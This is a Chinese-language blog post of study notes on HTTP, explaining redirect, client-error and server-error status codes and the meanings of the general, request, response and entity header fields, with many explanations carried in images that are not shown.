<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/35.png" alt="35"></p>
<p>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。</p>
<p>303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确 表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。</p>
<p>比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望 客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态 码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303 状态码是最理想的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/36.png" alt="36"></p>
<p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应 的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关 系。</p>
<blockquote>
<p><strong>附带条件</strong>的请求是指采用 GET 方法的请求报文中包含 If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/37.png" alt="37"></p>
<p>临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准<br>禁止 POST 变换成 GET，但实际使用时大家并不遵守。 307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
<h3 id="4XX-客户端错误（4XX-的响应结果表明客户端是发生错误的原因所在）"><a href="#4XX-客户端错误（4XX-的响应结果表明客户端是发生错误的原因所在）" class="headerlink" title="4XX 客户端错误（4XX 的响应结果表明客户端是发生错误的原因所在）"></a>4XX 客户端错误（4XX 的响应结果表明<em>客户端</em>是发生错误的原因所在）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/38.png" alt="38"></p>
<p>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求 的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态 码。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/39.png" alt="39"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/40.png" alt="40"></p>
<p>该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、 DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示 用 户认证失败。 </p>
<p>返回含有 401 的响应必须包含一个适用于被请求资源的 WWWAuthenticate 首部用以质询（challenge）用户信息。当浏览器初次接收 到 401 响应，会弹出认证用的对话窗口。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/41.png" alt="41"></p>
<p>该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要 给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。<br>未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/42.png" alt="42"></p>
<p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端<strong>拒绝请求且不想说明理由</strong>时使用。 </p>
<h3 id="5XX-服务器错误（5XX-的响应结果表明服务器本身发生错误。-）"><a href="#5XX-服务器错误（5XX-的响应结果表明服务器本身发生错误。-）" class="headerlink" title="5XX 服务器错误（5XX 的响应结果表明服务器本身发生错误。 ）"></a>5XX 服务器错误（5XX 的响应结果表明<em>服务器</em>本身发生错误。 ）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/43.png" alt="43"></p>
<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/44.png" alt="44"></p>
<p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法 处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回给客户端。</p>
<blockquote>
<p>状态码和状况的不一致<br>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。 比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种 情况也经常遇到。</p>
</blockquote>
<h2 id="首部字段"><a href="#首部字段" class="headerlink" title="首部字段"></a>首部字段</h2><p>HTTP/1.1 规范定义了如下 47 种首部字段。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/45.png" alt="45"></p>
<p><strong>请求首部字段</strong></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/46.png" alt="46"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/47.png" alt="47"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/48.png" alt="48"></p>
<p>在 HTTP 协议通信交互中使用到的首部字段，不限于 RFC2616 中定 义的 47 种首部字段。还有 Cookie、Set-Cookie 和 Content-Disposition 等在其他 RFC 中定义的首部字段，它们的使用频率也很高。 </p>
<p>这些非正式的首部字段统一归纳在 RFC4229 HTTP Header Field Registrations 中。 </p>
<blockquote>
<p><strong>注：</strong></p>
<p><strong>End-to-end 首部和 Hop-by-hop 首部</strong> </p>
<p>HTTP 首部字段将定义成缓存代理和非缓存代理的行为，分成 2 种类 型。</p>
<p><strong>端到端首部（End-to-end Header）</strong> </p>
<p>分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p>
<p><strong>逐跳首部（Hop-by-hop Header）</strong><br>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再 转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提 供 Connection 首部字段。</p>
<p>下面列举了 HTTP/1.1 中的逐跳首部字段。除这 8 个首部字段之外， 其他所有字段都属于端到端首部。</p>
<ol>
<li>Connection </li>
<li>Keep-Alive </li>
<li>Proxy-Authenticate </li>
<li>Proxy-Authorization </li>
<li>Trailer </li>
<li>TE </li>
<li>Transfer-Encoding </li>
<li>Upgrade </li>
</ol>
</blockquote>
<h3 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h3><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><p>通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/49.png" alt="49"></p>
<p><em>可用的指令按请求和响应分类如下所示。</em></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/50.png" alt="50"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/51.png" alt="51"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/52.png" alt="52"></p>
<p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 </p>
<p><strong>客户端</strong>发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发 给源服务器。</p>
<p>如果<strong>服务器</strong>返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/53.png" alt="53"></p>
<p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么<em>客户端</em>I在接收到这个被指定参数值的首 部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首 部字段可以使用缓存。只能在<strong>响应指令</strong>中指定该参数。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/54.png" alt="54"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/55.png" alt="55"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/56.png" alt="56"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/57.png" alt="57"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/58.png" alt="58"></p>
<h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><p>Connection 首部字段具备如下两个作用。</p>
<ol>
<li>控制不再转发给代理的首部字段</li>
<li>管理持久连接</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/59.png" alt="59"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/60.png" alt="60"></p>
<h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p>表明创建HTTP报文的日期和时间。</p>
<h4 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/62.png" alt="62"></p>
<h4 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h4><p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的 版本进行通信，其参数值可以用来指定一个完全不同的通信协议</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/63.png" alt="63"></p>
<p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两 个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。 Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务 器之间。因此，使用首部字段 Upgrade 时，还需要额外指定 Connection:Upgrade。 </p>
<h4 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/64.png" alt="64"></p>
<p>Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使 用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中 Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况 下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响 应。</p>
<h4 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/65.png" alt="65"></p>
<h3 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于<strong>补充请求的附加信息、客户端信息、对响应内容相关的优先级</strong>等 内容。</p>
<h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p>Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体 类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。</p>
<ol>
<li>文本文件<br>text/html, text/plain, text/css … application/xhtml+xml, application/xml …</li>
<li>图片文件<br>image/jpeg, image/gif, image/png …</li>
<li>视频文件<br>video/mpeg, video/quicktime …</li>
<li>应用程序使用的二进制文件<br>application/octet-stream, application/zip … </li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/66.png" alt="66"></p>
<p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值 1，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点 后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p>
<h4 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h4><p>Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及 字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字 段 Accept 相同的是可用权重 q 值来表示相对优先级。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/67.png" alt="67"></p>
<h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及 内容编码的优先级顺序。可一次性指定多种内容编码。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/68.png" alt="68"></p>
<p>下面试举出几个内容编码的例子。</p>
<ol>
<li>gzip 由文件压缩程序 gzip（GNU zip）生成的编码格式 （RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余 校验（Cyclic Redundancy Check，通称 CRC）。 </li>
<li>compress 由 UNIX 文件压缩程序 compress 生成的编码格式，采用 LempelZiv-Welch 算法（LZW）。 </li>
<li>deflate 组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法 （RFC1951）生成的编码格式。 </li>
<li>identity<br>不执行压缩或不会变化的默认编码格式</li>
</ol>
<p>采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另 外，也可使用星号（*）作为通配符，指定任意的编码格式。 </p>
<h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然 语言集（指中文或英文等），以及自然语言集的相对优先级。可一次 指定多种自然语言集。</p>
<p>和 Accept 首部字段一样，按权重值 q 来表示相对优先级。在下面图例中，客户端在服务器有中文版资源的情况下，会请求其返回中文版 对应的响应，没有中文版时，则请求返回英文版响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/69.png" alt="69"></p>
<h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的 401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存 在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/70.png" alt="70"></p>
<h4 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h4><p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行 为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回 状态码 417 Expectation Failed。 </p>
<p>客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规 范只定义了 100-continue（状态码 100 Continue 之意）。 </p>
<p>等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100continue。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/71.png" alt="71"></p>
<h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地 址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的 电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但 可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段 内）。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/72.png" alt="72"></p>
<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端 口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请 求内的首部字段。</p>
<p>首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制 有很密切的关联，这是首部字段 Host 必须存在的意义。 </p>
<p>请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解 决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务 器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部 字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直 接发送一个空值即可。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/73.png" alt="73"></p>
<h4 id="If-XXX"><a href="#If-XXX" class="headerlink" title="If-XXX"></a>If-XXX</h4><p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>
<h5 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h5><p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用 的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。（请参 照本章有关首部字段 ETag 的说明）</p>
<p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致 时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响 应。</p>
<p>还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务 器将会忽略 ETag 的值，只要资源存在就处理请求。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/74.png" alt="74"></p>
<h5 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h5><p>首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match 作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与 请求资源的 ETag 不一致时，它就告知服务器处理该请求。 </p>
<p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/76.png" alt="76"></p>
<h5 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h5><p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。 获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/75.png" alt="75"></p>
<h5 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h5><p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。</p>
<h5 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h5><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/77.png" alt="77"></p>
<p>思考：If-Range存在的意义</p>
<p>当资源更新后，其ETag值会改变。所以当客户端持有部分文件而请求另一部分文件时，如果单单用GET请求，服务器会返回412 Precondition Failed，这样客户端还需再发一遍GET来获取更新后的全部文件，会用双倍时间。</p>
<h4 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h4><p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 MaxForwards 的请求时，该字段以十进制整数形式指定可经过的服务器最 大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的 值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求 时，则不再进行转发，而是直接返回响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/78.png" alt="78"></p>
<p>使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中， 如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到 服务器返回的响应了。对此，我们无从可知。</p>
<p>可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展 开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回 响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状 况有所把握。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/79.png" alt="79"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/80.png" alt="80"></p>
<h4 id="Proxy-Authorization"><a href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h4><p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段 Proxy-Authorization 的请求，以告知服务器认证所需要的信息。 </p>
<p>这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同 之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间 的认证，使用首部字段 Authorization 可起到相同作用。</p>
<h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服 务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第 10000 字节的资源。 </p>
<p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状 态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返 回状态码 200 OK 的响应及全部资源。</p>
<h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>首部字段 Referer 会告知服务器请求的原始资源的 URI。 </p>
<p>客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器 的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字 段。</p>
<p>因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信 息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的 泄露。</p>
<p>另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直 沿用这个错误的拼写。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/81.png" alt="81"></p>
<h4 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/82.png" alt="82"></p>
<h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>首部字段 User-Agent 会将<strong>创建请求的浏览器</strong>和<strong>用户代理名称</strong>等信息传 达给服务器。</p>
<p>由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。 </p>
<h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于<strong>补充响应的附加信息</strong>、<strong>服务器信息</strong>，以及<strong>对客户端的附加要求</strong>等信息。</p>
<h4 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/83.png" alt="83"></p>
<h4 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/84.png" alt="84"></p>
<h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串 形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。</p>
<p>另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有 统一的算法规则，而仅仅是由服务器来分配。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/85.png" alt="85"></p>
<p>资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 <a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a> 时，就会返回中文版对应的资源，而 使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的 URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下 载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/86.png" alt="86"></p>
<blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/87.png" alt="87"></p>
</blockquote>
<h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置 不同的资源。</p>
<p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的 URI。 </p>
<p>几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/88.png" alt="88"></p>
<h4 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h4><p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送 给客户端。</p>
<p>它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在 于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间 进行认证时，首部字段 WWW-Authorization 有着相同的作用。有关 HTTP 访问认证，后面的章节会再进行详尽阐述。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/89.png" alt="89"></p>
<h4 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/93.png" alt="93"></p>
<h4 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h4><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要 配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使 用。</p>
<p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/90.png" alt="90"></p>
<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/91.png" alt="91"></p>
<h4 id="Vary"><a href="#Vary" class="headerlink" title="Vary"></a>Vary</h4><p>首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关 于本地缓存使用方法的命令。</p>
<p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若 再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回 缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相 同，因此必须要从源服务器重新获取资源。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/92.png" alt="92"></p>
<p>图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求 时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓 存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回.</p>
<h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首 部，用于补充内容的更新时间等与实体相关的信息。</p>
<h4 id="Allow"><a href="#Allow" class="headerlink" title="Allow"></a>Allow</h4><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所 有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支 持的 HTTP 方法写入首部字段 Allow 后返回。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/94.png" alt="94"></p>
<h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/95png.png" alt="95png"></p>
<h4 id="Content-Language"><a href="#Content-Language" class="headerlink" title="Content-Language"></a>Content-Language</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/96.png" alt="96"></p>
<h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/97.png" alt="97"></p>
<h4 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h4><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首 部字段 Location 不同，Content-Location 表示的是报文主体返回资源对 应的 URI。 </p>
<p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当 返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。（访问 <a href="http://www.hackr.jp/" target="_blank" rel="noopener">http://www.hackr.jp/</a> 返回的对象却是 <a href="http://www.hackr.jp/index-ja.html" target="_blank" rel="noopener">http://www.hackr.jp/index-ja.html</a> 等类似情况） </p>
<h4 id="Content-MD5"><a href="#Content-MD5" class="headerlink" title="Content-MD5"></a>Content-MD5</h4><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检 查报文主体在传输过程中是否保持完整，以及确认传输到达。</p>
<p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编 码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进 制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接 收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p>
<p>采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出 恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味 着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户 端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过 的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/98.png" alt="98"></p>
<h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客 户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为 单位，表示当前发送部分及整个实体大小。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/99.png" alt="99"></p>
<h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字 段 Accept 一样，字段值用 type/subtype 形式赋值。</p>
<blockquote>
<p>Content-Type: text/html; charset=UTF-8</p>
</blockquote>
<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接 收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间<strong>之前</strong>，响应的副本会一直被保存。当超过指定的时间<strong>后</strong>，缓存服务器在请求发送过来时，会转向源服务器请求 资源。</p>
<p>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写 入与首部字段 Date 相同的时间值。 </p>
